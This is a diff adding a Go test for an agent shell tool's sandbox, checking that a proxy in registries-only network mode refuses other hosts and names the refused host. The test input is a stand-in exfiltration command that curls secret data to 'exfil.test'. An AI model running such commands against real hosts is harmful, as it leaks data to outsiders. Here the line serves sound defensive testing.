@@ -83,3 +83,29 @@ func TestAnUnsandboxedCommandSaysSo(t *testing.T) {
 		t.Fatalf("an unconfined command did not say so: %q", result.Content)
 	}
 }
+
+// With the network limited to registries, a command's request to any other host is refused by the
+// proxy, and the result says which host, so the model neither retries blindly nor calls the
+// network down.
+func TestRegistriesModeRefusesOtherHosts(t *testing.T) {
+	if err := sandbox.Available(); err != nil {
+		t.Skipf("no sandbox here: %v", err)
+	}
+	if runtime.GOOS != "darwin" {
+		t.Skip("covered on macOS; Landlock limits by port")
+	}
+	if _, err := osexec.LookPath("curl"); err != nil {
+		t.Skip("curl makes the request")
+	}
+	t.Setenv("CANOPY_SANDBOX_NETWORK", "registries")
+	w := testWorkspace(t)
+	input, _ := json.Marshal(map[string]string{"command": "curl -s http://exfil.test/?data=secret"})
+	result, err := ShellTool(w).Run(context.Background(), input)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if !strings.Contains(result.Content, "does not allow exfil.test") ||
+		!strings.Contains(result.Content, "allow list refused: exfil.test") {
+		t.Fatalf("the refusal was not reported:\n%s", result.Content)
+	}
+}
